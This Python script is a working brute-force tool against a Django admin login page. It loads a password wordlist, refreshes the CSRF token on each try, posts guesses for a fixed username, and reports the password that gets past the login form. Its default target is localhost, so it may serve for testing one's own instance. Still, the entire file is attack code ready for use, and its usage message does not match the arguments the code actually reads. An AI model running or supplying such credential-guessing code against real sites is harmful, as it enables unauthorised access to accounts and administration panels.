import sys
import requests
from bs4 import BeautifulSoup


class BFLoginPanel:
    def __init__(self, domain: str, username: str, password: str):
        self.domain = domain
        self.username = username
        self.password = password
        self.cookies = {}
        self.session = requests.Session()
        self.url = domain + "/admin/login/?next=/admin"
        self.protocol_mode = "Local File Mode"


        print(self.protocol_mode + " (" + self.password + ")")
        self.headers = {
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\
            '(KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Referer': self.domain + '/admin/login/?next=/admin'
        }
        try:
            self.file = open(password, "r")
            self.wordlist = list(set([(word.strip()) for word in self.file.readlines()]))
            self.file.close()
        except Exception as exception:
            print("[-] Error:\n", exception)
            sys.exit()
        self.login_page = self.session.get(self.url)
        self.bruteforce()

    def bruteforce(self):
        count = 0
        for self.password in self.wordlist:
            for key, value in self.session.cookies.items():
                self.cookies[key] = value
            self.soup = BeautifulSoup(self.login_page.text, 'html.parser')
            self.csrf_input = self.soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

            url = self.domain + "/admin/login/?next=/admin"
            self.login_page = self.session.post(url, data={'csrfmiddlewaretoken': self.csrf_input,
            'username': self.username,
            'password': self.password}, cookies=self.cookies, headers=self.headers)

            if "CSRF" in self.login_page.text:
                print("[+] Error:\nCSRF token missing or incorrect.")
                sys.exit()
            if "Please " not in self.login_page.text:
                print("[+] Found! " + self.username + " - " + self.password +
                " - "+ str(self.login_page.status_code)+"\n\n")
                sys.exit()
            else:
                count += 1
                print("(" + str(count) + ") Attempt: " + self.username + " - "
                + self.password + " - "+ str(self.login_page.status_code))


if __name__ == '__main__':
    try:
        DOMAIN = "http://localhost:8000"
        USERNAME = "test"
        PASSWORD = sys.argv[1]
        BFLoginPanel(DOMAIN,USERNAME,PASSWORD)
    except IndexError:
        print(f"Command Line: python {sys.argv[0]} domain username wordlist_file")

